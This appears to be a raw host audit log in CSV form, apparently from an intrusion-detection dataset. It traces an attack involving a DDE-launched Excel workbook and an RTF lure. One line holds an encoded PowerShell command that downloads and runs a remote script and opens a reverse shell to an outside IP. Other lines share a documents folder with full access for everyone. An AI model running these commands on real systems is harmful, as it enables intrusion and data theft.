86371755-C67E-43FB-A2AF-2FEECDED22BA,{'subject': 'None None'},513028
D02980A5-44AC-47E2-8A9F-BF14C10A8D5E,"{'file': '{""Device\\\\\\\\HarddiskVolume2\\\\\\\\Users\\\\\\\\admin\\\\\\\\Desktop\\\\\\\\~$BoviaBenefitsOE.xlsm""}'}",1001223
4D884AC3-1123-40E3-A5DE-03CC05C2E203,"{'subject': 'None \\""C:\\\\Program Files (x86)\\\\Microsoft Office\\\\Office15\\\\WINWORD.EXE\\"" /n \\""C:\\\\Users\\\\admin\\\\Documents\\\\MissleAlert.rtf\\"" /o \\""\\""'}",513033
9FA60DBE-D055-4223-B807-8E400ECDF222,{'subject': 'None None'},300810
FFD02360-2B85-4E38-8F34-3241E4AFA670,{'subject': 'None None'},511757
EB4D8622-845B-44F8-A581-A2CFA2A3E219,{'subject': 'None None'},621593
9CDCAA42-32FA-4B4C-BFF6-E2F3EBF12AA9,"{'file': '{""Device\\\\\\\\HarddiskVolume2\\\\\\\\Users\\\\\\\\admin\\\\\\\\Documents\\\\\\\\mydocs""}'}",1332127
40B0E1F9-9E82-40C6-A67E-441DF614CAB4,"{'file': '{""\\\\\\\\Device\\\\\\\\HarddiskVolume2\\\\\\\\Users\\\\\\\\admin\\\\\\\\Documents\\\\\\\\mydocs""}'}",1332128
B9A9FB5F-B199-4C69-8A34-13F344106820,"{'file': '{""\\\\\\\\Device\\\\\\\\HarddiskVolume2\\\\\\\\Users\\\\\\\\admin\\\\\\\\Documents\\\\\\\\mydocs\\\\\\\\""}'}",1332129
437A617F-BF9C-402B-9AC1-74040E8F6A68,"{'file': '{""C:\\\\\\\\Users\\\\\\\\admin\\\\\\\\Documents\\\\\\\\mydocs""}'}",1332130
40989DD5-C389-4C76-8435-8B6074F19659,"{'file': '{""\\\\\\\\Device\\\\\\\\HarddiskVolume2\\\\\\\\ProgramData\\\\\\\\update.ps1""}'}",1331626
9ED8A6DD-4421-49EF-952C-95345205919B,{'subject': 'None powershell  -nop -ep bypass -encodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADgALgA3ADUALgAxADEANwAuADUALwB1AHAAZABhAHQAZQAuAHAAcwAxACcALAAgACcAQwA6AFwAcAByAG8AZwByAGEAbQBkAGEAdABhAFwAdQBwAGQAYQB0AGUALgBwAHMAMQAnACkAOwAgAC4AIABDADoAXABcAHAAcgBvAGcAcgBhAG0AZABhAHQAYQBcAFwAdQBwAGQAYQB0AGUALgBwAHMAMQA7ACAAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMgAwADgALgA3ADUALgAxADEANwAuADYAIAAtAHAAIAA4ADAAIAAtAGUAIABjAG0AZAAuAGUAeABl'},511788
C0F74D6F-1CAE-496E-B280-7230CF4EDCE4,"{'file': '{""Device\\\\\\\\HarddiskVolume2\\\\\\\\ProgramData\\\\\\\\update.ps1""}'}",1331631
747BEAA2-4E2E-4EB5-9D15-BDAB9391B84C,"{'file': '{""\\\\\\\\Device\\\\\\\\HarddiskVolume2\\\\\\\\Windows\\\\\\\\System32\\\\\\\\taskkill.exe""}'}",1331378
D3FB71D4-6CD5-4D30-8CD7-EF82EEB5B5C8,"{'file': '{""C:\\\\\\\\ProgramData\\\\\\\\update.ps1""}'}",1331637
8EE116E4-FCFD-4934-8822-F14E8B9C45DB,"{'file': '{""Device\\\\\\\\HarddiskVolume2\\\\\\\\Users\\\\\\\\admin\\\\\\\\Documents\\\\\\\\Document.rtf""}'}",1316025
4B9A91FF-9531-4338-91F3-2F09168E423F,"{'file': '{""C:\\\\\\\\Users\\\\\\\\admin\\\\\\\\Documents\\\\\\\\Document.rtf""}'}",1316026
2A9FBA61-0097-42E9-B093-AC97FFBF809C,"{'file': '{""\\\\\\\\Device\\\\\\\\HarddiskVolume2\\\\\\\\Windows\\\\\\\\System32\\\\\\\\KernelBase.dll""}'}",921018
782F5774-7E01-44B8-989E-E2CFA54A0E0D,"{'file': '{""Device\\\\\\\\HarddiskVolume2\\\\\\\\Users\\\\\\\\admin\\\\\\\\Documents\\\\\\\\MissleAlert.rtf""}'}",1364796
02EDFE8D-AC2D-4B93-85F5-4DA6A16F32EE,"{'file': '{""C:\\\\\\\\Users\\\\\\\\admin\\\\\\\\Documents\\\\\\\\MissleAlert.rtf""}'}",1364797
236258AC-BEE3-4888-A2EC-7609AD28731F,"{'file': '{""\\\\\\\\Device\\\\\\\\HarddiskVolume2\\\\\\\\Users\\\\\\\\admin\\\\\\\\Documents\\\\\\\\MissleAlert.rtf""}'}",1364799
B8CA5857-4C0F-4E3C-8CDA-25F7107199DB,"{'file': '{""\\\\\\\\Device\\\\\\\\HarddiskVolume2\\\\\\\\Users\\\\\\\\admin\\\\\\\\Documents\\\\\\\\Document.rtf""}'}",1315523
255E412F-EFDC-4A34-AACB-878071C24533,{'subject': 'None None'},300740
3D0B2B2A-0262-4F64-8F99-6FCA9F07B3DB,{'subject': 'None taskkill  8744'},513221
E9983EA8-08EC-441A-A126-235061CEEC80,{'subject': 'None None'},513222
64C725D4-119F-48D3-A320-EDD5262C0A40,{'subject': 'None None'},450376
3305472C-15EC-4039-BD1E-880D6A616D19,{'subject': 'None None'},512969
ED63BF6B-0726-40AF-BDB8-EA67BE98B198,{'subject': 'None None'},511818
440C2E9D-DA7B-40C2-9EE6-5393463347B1,"{'subject': 'None \\""C:\\\\WINDOWS\\\\system32\\\\SearchProtocolHost.exe\\"" Global\\\\UsGthrFltPipeMssGthrPipe257_ Global\\\\UsGthrCtrlFltPipeMssGthrPipe257 1 -2147483646 \\""Software\\\\Microsoft\\\\Windows Search\\"" \\""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)\\"" \\""C:\\\\ProgramData\\\\Microsoft\\\\Search\\\\Data\\\\Temp\\\\usgthrsvc\\"" \\""DownLevelDaemon\\"" '}",512841
3E1C1557-0411-45D1-82A3-F981A37FAF80,"{'subject': 'None \\""cmd.exe\\""'}",511816
2821CE71-3A60-48A3-83A7-A471BB383B4A,"{'file': '{""Device\\\\\\\\HarddiskVolume2\\\\\\\\Users\\\\\\\\admin""}'}",926537
9D981C5B-6008-463D-853C-4462B6DF7DFB,{'subject': 'None taskkill  /PID 8744 /F'},513231
62FF1FEA-01E1-4528-874F-5F0778288B6E,{'subject': 'None None'},512847
F9D372B6-3686-4DA3-8CAA-E475B3811B8C,"{'file': '{""C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\taskkill.exe""}'}",1332306
B0CCB7EB-DAF0-41E1-9997-4B3478E76798,"{'file': '{""\\\\\\\\Device\\\\\\\\HarddiskVolume2\\\\\\\\Users\\\\\\\\admin""}'}",926547
55394081-0A7C-4E8E-8C2F-5035F7E370B8,"{'file': '{""\\\\\\\\Device\\\\\\\\HarddiskVolume2\\\\\\\\WINDOWS\\\\\\\\system32\\\\\\\\taskkill.exe.Config""}'}",1332308
4C1954FB-0316-485D-904B-31344D6649DA,"{'file': '{""Device\\\\\\\\HarddiskVolume2\\\\\\\\Users\\\\\\\\admin\\\\\\\\Documents\\\\\\\\trains.rtf""}'}",1316053
23949574-24D4-4089-854F-8BB934A2934F,{'file': '{taskkill.exe}'},1332310
53B52C96-4521-47CB-92E9-8E5FDF99D29D,"{'file': '{""Device\\\\\\\\HarddiskVolume2\\\\\\\\Windows\\\\\\\\System32\\\\\\\\taskkill.exe""}'}",1332311
10C50106-71F5-4A17-ADC3-4B54787BB8FC,"{'file': '{""Device\\\\\\\\HarddiskVolume2\\\\\\\\Windows\\\\\\\\System32\\\\\\\\en-US\\\\\\\\taskkill.exe.mui""}'}",1332312
3EA7FB5E-0598-4974-9600-0CB44ABB35BA,"{'file': '{""\\\\\\\\Device\\\\\\\\HarddiskVolume2\\\\\\\\Users\\\\\\\\admin\\\\\\\\Documents\\\\\\\\trains.rtf""}'}",1316054
0BFE17F6-9C70-44E6-AAE6-3251859F22C7,"{'file': '{""C:\\\\\\\\Windows\\\\\\\\System32\\\\\\\\en-US\\\\\\\\taskkill.exe.mui""}'}",1332314
C3F96165-D4D5-458A-BBBE-84A71E1D444F,"{'file': '{""\\\\\\\\Device\\\\\\\\HarddiskVolume2\\\\\\\\Windows\\\\\\\\System32\\\\\\\\en-US\\\\\\\\taskkill.exe.mui""}'}",1332315
9E8F6990-153B-4A4B-8499-3AAAC2008E5B,"{'file': '{""C:\\\\\\\\Users\\\\\\\\admin\\\\\\\\Documents\\\\\\\\trains.rtf""}'}",1316052
DCD013E9-7010-4A51-9FEC-8B653C981C7C,"{'file': '{""\\\\\\\\Device\\\\\\\\HarddiskVolume2\\\\\\\\Users\\\\\\\\admin\\\\\\\\AppData\\\\\\\\Roaming\\\\\\\\Microsoft\\\\\\\\Excel\\\\\\\\BoviaBenefitsOE306586132161491315\\\\\\\\BoviaBenefitsOE.xlsm.lnk""}'}",1332062
FE198927-F937-4FD2-B6E6-041C3D47017B,{'subject': 'None net  share mydocs=C:\\\\Users\\\\admin\\\\Documents\\\\mydocs '},512863
15DA2C71-74C2-40F1-9D3E-27F2F098C921,"{'file': '{""Device\\\\\\\\HarddiskVolume2\\\\\\\\Users\\\\\\\\admin\\\\\\\\AppData\\\\\\\\Roaming\\\\\\\\Microsoft\\\\\\\\Excel\\\\\\\\BoviaBenefitsOE306586132161491315\\\\\\\\BoviaBenefitsOE.xlsm.lnk""}'}",1332064
58DA6981-E3A9-4F28-BFCA-C27F66331B20,"{'file': '{""\\\\\\\\Device\\\\\\\\HarddiskVolume2\\\\\\\\Users\\\\\\\\admin\\\\\\\\Documents\\\\\\\\MissleAlert.rtf:Zone.Identifier""}'}",1332193
54937D7E-B2F2-4A1E-B631-8E946174793D,{'subject': 'None C:\\\\WINDOWS\\\\system32\\\\net1  share mydocs=C:\\\\Users\\\\admin\\\\Documents\\\\mydocs '},512867
34DA6E7F-067D-4FCB-AF1F-014F36D3AF7B,"{'file': '{""Device\\\\\\\\HarddiskVolume2\\\\\\\\Users\\\\\\\\admin\\\\\\\\Documents\\\\\\\\BoviaBenefitsOE.xlsm""}'}",1001192
845B7C61-4397-4E0D-A23A-A22BDE2CA4D7,"{'file': '{""\\\\\\\\Device\\\\\\\\HarddiskVolume2\\\\\\\\Users\\\\\\\\admin\\\\\\\\Documents\\\\\\\\BoviaBenefitsOE.xlsm""}'}",1001194
92161288-8270-4B8E-93B5-E9E81140C04C,"{'subject': 'None net  share mydocs=C:\\\\Users\\\\admin\\\\Documents\\\\mydocs /grant:everyone,FULL'}",512875
410FC7CC-FBEA-4F03-866C-B48F9D141521,"{'file': '{""Device\\\\\\\\HarddiskVolume2""}'}",921596
19DEF44F-36D5-43D3-9D1E-EB80AD06C22B,"{'file': '{""C:\\\\\\\\Users\\\\\\\\admin\\\\\\\\AppData\\\\\\\\Roaming\\\\\\\\Microsoft\\\\\\\\Excel\\\\\\\\BoviaBenefitsOE306586132161491315\\\\\\\\BoviaBenefitsOE.xlsm.lnk""}'}",1332077
91386EE2-F150-4B10-8B18-954A8C04198D,{'subject': 'None None'},511596
97485B66-8CFA-4448-BA56-8D7F67EBA308,"{'subject': 'None C:\\\\WINDOWS\\\\system32\\\\net1  share mydocs=C:\\\\Users\\\\admin\\\\Documents\\\\mydocs /grant:everyone,FULL'}",512879
EF82624E-5D48-4520-8642-0ACF0651E5F7,"{'subject': 'None \\""C:\\\\Program Files (x86)\\\\Microsoft Office\\\\Office15\\\\EXCEL.EXE\\"" /dde'}",511595
CFFDF1EF-1349-428E-A4E3-26460EE8F8F4,{'subject': 'None None'},512235
A2228FBE-118E-44C1-8D52-0A66D3CC12AC,{'netflow': '128.55.12.67:57619->208.75.117.5:80'},95347
6C407DBE-9B5F-443F-BB1C-1DD12FAA1C6C,"{'file': '{""Device\\\\\\\\DeviceApi""}'}",923509
541E7952-4CE8-4AE4-9219-F450D3E6D300,"{'file': '{""Device\\\\\\\\HarddiskVolume2\\\\\\\\Users\\\\\\\\admin\\\\\\\\Desktop\\\\\\\\BoviaBenefitsOE.xlsm""}'}",1001210
214DB50B-FC64-492E-9246-ACA531EB97E2,"{'file': '{""Device\\\\\\\\HarddiskVolume2\\\\\\\\Users\\\\\\\\admin\\\\\\\\Desktop\\\\\\\\BoviaBenefitsOE.xlsm:Zone.Identifier""}'}",1001212
49DC2715-EC0F-46A7-8A39-9E6061204AC4,"{'file': '{""\\\\\\\\Device\\\\\\\\HarddiskVolume2\\\\\\\\Users\\\\\\\\admin\\\\\\\\Desktop\\\\\\\\BoviaBenefitsOE.xlsm""}'}",1001213
